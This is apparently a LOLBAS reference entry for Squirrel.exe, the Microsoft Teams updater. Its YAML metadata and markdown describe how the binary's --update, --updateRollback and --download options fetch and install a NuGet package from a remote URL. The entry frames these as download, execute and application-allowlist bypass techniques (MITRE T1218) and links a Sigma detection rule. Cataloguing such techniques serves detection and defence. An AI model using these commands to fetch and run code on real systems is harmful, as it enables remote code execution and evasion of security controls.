---
Acknowledgement:
- Handle: '@reegun21'
  Person: Reegun J (OCBC Bank)
- Person: A
Author: Reegun J (OCBC Bank) - @reegun21
Code_Sample:
- Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
Commands:
- Category: Download
  Command: squirrel.exe --download {REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file and download
    the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Usecase: Download binary
- Category: AWL Bypass
  Command: squirrel.exe --update {REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: squirrel.exe --update {REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: AWL Bypass
  Command: squirrel.exe --updateRollback={REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: squirrel.exe --updateRollback={REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download
    and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
Created: 2019-06-26
Description: Binary to update the existing installed Nuget/squirrel package. Part
  of Microsoft Teams installation.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
Full_Path:
- Path: C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe
Name: Squirrel.exe
Resources:
- Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
- Link: https://twitter.com/reegun21/status/1144182772623269889
- Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
- Link: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
- Link: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
mitre_data:
  technique_ids:
  - T1218
tags:
- lolbas/othermsbinaries
---

# Squirrel.exe

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

# Path(s)

- `C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe`

# Execute Commands

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```batch
squirrel.exe --update {REMOTEURL}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



The above binary will go to url and look for RELEASES file, download and install the nuget package.

```batch
squirrel.exe --updateRollback={REMOTEURL}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



# AWL Bypass Commands

The above binary will go to url and look for RELEASES file, download and install the nuget package.

```batch
squirrel.exe --update {REMOTEURL}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



The above binary will go to url and look for RELEASES file, download and install the nuget package.

```batch
squirrel.exe --updateRollback={REMOTEURL}
```

- **Usecase:** Download and execute binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



# Download Commands

The above binary will go to url and look for RELEASES file and download the nuget package.

```batch
squirrel.exe --download {REMOTEURL}
```

- **Usecase:** Download binary
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 7 and up with Microsoft Teams installed



# Resource(s)

- https://www.youtube.com/watch?v=rOP3hnkj7ls
- https://twitter.com/reegun21/status/1144182772623269889
- http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
- https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
- https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
# Acknowledgements

- Reegun J (OCBC Bank) - @reegun21 (Authored, 2019-06-26)
- Reegun J (OCBC Bank) (@reegun21)
- A